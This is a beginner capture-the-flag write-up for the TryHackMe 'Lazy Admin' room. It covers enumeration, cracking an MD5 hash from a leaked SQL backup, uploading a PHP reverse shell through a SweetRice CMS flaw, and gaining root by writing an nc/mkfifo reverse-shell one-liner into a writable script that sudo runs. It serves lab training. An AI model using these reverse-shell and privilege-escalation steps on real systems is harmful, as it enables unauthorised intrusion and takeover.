---
title : Lazy Admin - TryHackMe WriteUp
author : Seif-Allah
description : Beginner level writeUp for the "Lazy Admin" room.
layout : post
category : CTF-WriteUp
---

### <mark style='background-color: white'>Introduction</mark>
'Lazy Admin' is an easy room made by [MrSeth6797](https://tryhackme.com/p/MrSeth6797), great for practice challenges. 
Let's get started! 

### <mark style='background-color: white'>Enumeration</mark>
Starting Nmap with the -A flag, here's the output : 
- - -
<pre>
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCo0a0DBybd2oCUPGjhXN1BQrAhbKKJhN/PW2OCccDm6KB/+sH/2UWHy3kE1XDgWO2W3EEHVd6vf7SdrCt7sWhJSno/q1ICO6ZnHBCjyWcRMxojBvVtS4kOlzungcirIpPDxiDChZoy+ZdlC3hgnzS5ih/RstPbIy0uG7QI/K7wFzW7dqMlYw62CupjNHt/O16DlokjkzSdq9eyYwzef/CDRb5QnpkTX5iQcxyKiPzZVdX/W8pfP3VfLyd/cxBqvbtQcl3iT1n+QwL8+QArh01boMgWs6oIDxvPxvXoJ0Ts0pEQ2BFC9u7CgdvQz1p+VtuxdH6mu9YztRymXmXPKJfB
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC8TzxsGQ1Xtyg+XwisNmDmdsHKumQYqiUbxqVd+E0E0TdRaeIkSGov/GKoXY00EX2izJSImiJtn0j988XBOTFE=
|   256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILe/TbqqjC/bQMfBM29kV2xApQbhUXLFwFJPU14Y9/Nm
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
</pre>
- - - 
Examining the source code of the running web service looking for some creds, found nothing. So I fire up gobuster using the *directory-list-2.3-medium.txt* wordlist and found a subdirectory called */content* : 
![/content](/assets/images/writeups/thm/lazy_admin/content.png)
Found out that "Basic-CMS Sweetrice" is running here, firing up gobuster again and adding */content* to the URI and here's the result: 
![/gobustercontent](/assets/images/writeups/thm/lazy_admin/gobuster_content.png)
Did some research about this CMS and found that the 1.5.1 version suffers from a code execution vulnerability via the use of a cross site request forgery flaw.
Check this link : [SweetRice-1.5.1-Code-Execution](https://packetstormsecurity.com/files/139521/SweetRice-1.5.1-Code-Execution.html)
So basically, this means that I can upload a php reverse shell and execute it but first we need some credentials to login and then upload our file, so we need more enumeration.
I examine the other subdirectories and there's a specific file that got my attention : */content/inc/mysql\_backup/mysql\_backup/mysql\_bakup\_20191129023059-1.5.1.sql* ! 
Examining it carefully, I found a username and a password hash (*line 79*).
The password hash type is MD5, I used hydra to crack it using the *rockyou.txt* wordlist and then logged in the *Sweetrice* CMS, easy hein ? 

### <mark style='background-color: white'>USER.txt - Easy Peasy</mark>
To get the reverse shell, I simply started my listener (*nc -nlvp 1234*) and then copied the */usr/share/webshells/php/php-reverse-shell.php* file inside the ads section, save it and run it as mentionad in the script above. and boom! got the reverse shell ! 
- - - 
<pre>
listening on [any] 1234 ...
connect to [10.2.36.150] from (UNKNOWN) [10.10.217.36] 56240
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 18:01:47 up 5 min,  0 users,  load average: 1.37, 2.14, 1.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
</pre>
- - -
This time, I was lucky by opening the *user.txt* file without any privelage escalation, and yeah it works ! 
- - - 
<pre>
$ cd /home
$ ls
itguy
$ cd itguy
$ cat user.txt
THM{#####################}
</pre>
- - -


### <mark style='background-color:white'>ROOT.txt</mark>
Now we need to find a way to get the root flag !
First of all, I ran *sudo -l* command : 
- - -

<pre>
$ sudo -l 
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
$ 
</pre>

- - -
Well, the user www-data can run the following command ? let's open the backup.pl file ! 
- - -
<pre>
$ cat /home/itguy/backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
</pre>
- - -
hum ! can we edit the copy.sh file so it gets executed as root ? 
- - -
<pre>
$ ls -al /etc/copy.sh
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
</pre>
- - -
and yeah we can edit it, SUPER ! So the first idea tha came in my mind is to get an another reverse shell using this command : 
- - - 
<pre> 
$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <local-ip> 5554 \>/tmp/f' \>/etc/copy.sh
</pre>
- - - 
After setting up the listener and ran the command, I got the root shell ! now it's time the get root flag !! :) finally ! 
- - - 
<pre>
root@kali:~# nc -nlvp 5554
listening on [any] 5554 ...
connect to [10.2.36.150] from (UNKNOWN) [10.10.217.36] 51512
/bin/sh: 0: can't access tty; job control turned off
# cat /root/root.txt
</pre>
- - - 
Congrats, now you pissed off the lazy admin ! 
